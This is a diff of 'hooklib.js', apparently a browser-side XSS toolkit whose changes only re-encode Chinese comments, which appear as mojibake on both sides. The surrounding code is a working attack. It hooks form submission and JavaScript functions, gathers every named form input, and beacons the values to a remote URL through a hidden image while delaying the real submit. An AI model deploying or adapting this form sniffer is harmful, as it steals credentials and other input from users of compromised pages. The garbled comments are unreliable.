@@ -1,6 +1,6 @@
 //alert("hooklib.js");
 /////////////////////////////////////////////////////
-//// hookÄ£¿é hook sumbmit; hook js function; 
+//// hookæ¨¡å— hook sumbmit; hook js function; 
 //// hook link
 /////////////////////////////////////////////////////
 /*
@@ -19,7 +19,7 @@ function hookSubmit(o, injectFuncCallBack) {
 
 		o.submit = function() {
 			//alert("submit hooked!");
-			// hookº¯ÊıµÄ¹¦ÄÜ×÷ÎªµÚ¶ş¸ö²ÎÊıÔÚÕâÀïµ÷ÓÃ
+			// hookå‡½æ•°çš„åŠŸèƒ½ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°åœ¨è¿™é‡Œè°ƒç”¨
 			injectFuncCallBack();					
 			o.onsubmit();
 		}
@@ -40,7 +40,7 @@ function logForm(o, url, delay) {
 	//alert("logForm");
 	var inputs = o.getElementsByTagName("input");
 	//url += "?";
-	var param = ""; // formµÄ²ÎÊı
+	var param = ""; // formçš„å‚æ•°
 
 	for (var i = 0; i < inputs.length; i ++) {
 		if (inputs[i].getAttribute("name") != null && 
@@ -49,7 +49,7 @@ function logForm(o, url, delay) {
 		}
 	}
 	
-	// ¼ÇÂ¼Ìá½»µÄ²ÎÊıµ½Ô¶³Ì·şÎñÆ÷
+	// è®°å½•æäº¤çš„å‚æ•°åˆ°è¿œç¨‹æœåŠ¡å™¨
 	param = XssGotFormSniffer_S + escape(param) + XssGotFormSniffer_E;
 	//getURL(url+param);
 	var img = document.createElement("IMG");
@@ -58,7 +58,7 @@ function logForm(o, url, delay) {
 	img.height = 0;
 	img.src = url+param;
 
-  // ÈÃÌá½»ÑÓÊ±,±£Ö¤logForm³É¹¦
+  // è®©æäº¤å»¶æ—¶,ä¿è¯logFormæˆåŠŸ
 	setTimeout(function(){
 			if (o._submit != undefined) {
 				o._submit();
@@ -73,13 +73,13 @@ function logForm(o, url, delay) {
 
 
 //////////////////////////////////////////////////////////
-// Ò»°ãJSº¯ÊıµÄhook
+// ä¸€èˆ¬JSå‡½æ•°çš„hook
 // by axis
 //////////////////////////////////////////////////////////
 var hookJsFunction = function (){
 	//alert("hookjsfunc");
-  // ±£´æÔ­º¯Êı;»¹ÊÇĞèÒª×÷Îª²ÎÊıÖ¸¶¨Ò»¸ö,
-  //·ñÔò¶à´Îhookºó»á¶ªÊ§Ö®Ç°±£´æµÄÔ­º¯Êı
+  // ä¿å­˜åŸå‡½æ•°;è¿˜æ˜¯éœ€è¦ä½œä¸ºå‚æ•°æŒ‡å®šä¸€ä¸ª,
+  //å¦åˆ™å¤šæ¬¡hookåä¼šä¸¢å¤±ä¹‹å‰ä¿å­˜çš„åŸå‡½æ•°
 	//var RealFuncAfterHooked;  
 
   return {
@@ -87,13 +87,13 @@ var hookJsFunction = function (){
 	  	try {
 	  	  setTimeout(function(){ 
 	  		  //alert("hook before: "+window[funcNameHooked]);
-	  		  // ±£´æÔ­º¯Êı
+	  		  // ä¿å­˜åŸå‡½æ•°
 	  		  window[RealFuncAfterHooked] = window[funcNameHooked];
 	  		  //window[funcNameHooked] = window[injectFunc];
-	  		  // ²ÎÊı¸öÊı¿ÉÒÔ¸ù¾İĞèÒª½øĞĞµ÷Õû
+	  		  // å‚æ•°ä¸ªæ•°å¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œè°ƒæ•´
 	  		  window[funcNameHooked] = function (parm1,param2,param3,param4,param5,param6,param7){
-	  			  window[injectFunc](parm1,param2,param3,param4,param5,param6,param7);   // ÏÈÖ´ĞĞ×¢ÈëµÄº¯Êı
-	  			  window[RealFuncAfterHooked](parm1,param2,param3,param4,param5,param6,param7);  // ÔÙÖ´ĞĞÔ­º¯Êı
+	  			  window[injectFunc](parm1,param2,param3,param4,param5,param6,param7);   // å…ˆæ‰§è¡Œæ³¨å…¥çš„å‡½æ•°
+	  			  window[RealFuncAfterHooked](parm1,param2,param3,param4,param5,param6,param7);  // å†æ‰§è¡ŒåŸå‡½æ•°
 	  			  }
 	  		  //alert("hook after: "+window[funcNameHooked]);
 	  		  }, 
@@ -109,7 +109,7 @@ var hookJsFunction = function (){
 	  	  setTimeout(function(){ 
 	  		  //alert("unhook before: "+window[funcNameHooked]);
 	  		  window[funcNameHooked] = function (parm1,param2,param3,param4,param5,param6,param7){
-	  			  window[RealFuncAfterHooked](parm1,param2,param3,param4,param5,param6,param7);  // Ö´ĞĞÔ­º¯Êı;
+	  			  window[RealFuncAfterHooked](parm1,param2,param3,param4,param5,param6,param7);  // æ‰§è¡ŒåŸå‡½æ•°;
 	  		  }
 	  		  //alert("unhook after: "+window[funcNameHooked]);
 	  		  }, 
